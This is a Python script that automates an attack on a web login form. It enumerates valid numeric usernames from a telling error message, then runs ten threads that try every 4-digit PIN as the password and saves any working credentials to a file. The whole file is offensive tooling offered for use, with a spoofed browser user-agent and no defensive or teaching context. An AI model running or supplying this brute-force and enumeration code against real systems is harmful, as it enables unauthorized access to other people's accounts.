import dotenv
import os
import threading
import requests as Requests

dotenv.load_dotenv()
url = os.getenv("API_ENDPOINT")
length = int(os.getenv("LEN_USERNAME"))

request_session = Requests

username_main = str(input("Input start Username : "))

username = ""

header = {
    "content-type":"application/x-www-form-urlencoded",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}

usrename_length = len(username_main)
isLength = True

while len(username_main)!=length:username_main = str(username_main)+"0"

username_number = int(username_main)

while(True):
    username_number += 1
    username = username_number
    print(username)
    body = {
        "txtLogin":username,
        "txtPasswd":username,
        "btnLogin":"Login",
        "reqUrl":"https://google.com/",
        "reqCheck":"false"
    }

    try:
        res = request_session.post(url=url,headers=header,data=body)
        if "Loginname or Password is invalid! (2)" in res.text:
            print(f"Username is : {username}")
            break
    except:pass

def getRun():
    df = open('app_status.txt', 'r', encoding='utf-8')
    return df.read()
def setRun(x):
    df = open('app_status.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def result(x): 
    df = open('app_result.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def BrutforcePassword(start,end,length):
    for i in range(start,end,+1):
        if getRun()=='0': return
        isLength = True
        password = str(i)
        while isLength:
            if getRun()=='0': return
            if(len(password)==length):
                isLength = False
                print(username,password)
            else:
                password = "0"+str(password)
        body = {
            "txtLogin":username,
            "txtPasswd":password,
            "btnLogin":"Login",
            "reqUrl":"",
            "reqCheck":"false"
        }
        try:
            res = request_session.post(url=url,headers=header,data=body)
            if "Login successfully" in res.text:
                print(f"username : {username} Login successfully Password is : {password}")
                result(f'usename : {username}, password : {password}')
                setRun("0")
        except:
            pass
setRun("1")

threading.Thread(target=BrutforcePassword,args=(0,1000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(1000,2000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(2000,3000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(3000,4000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(4000,5000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(5000,6000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(6000,7000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(7000,8000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(8000,9000,4,)).start()
threading.Thread(target=BrutforcePassword,args=(9000,10000,4,)).start()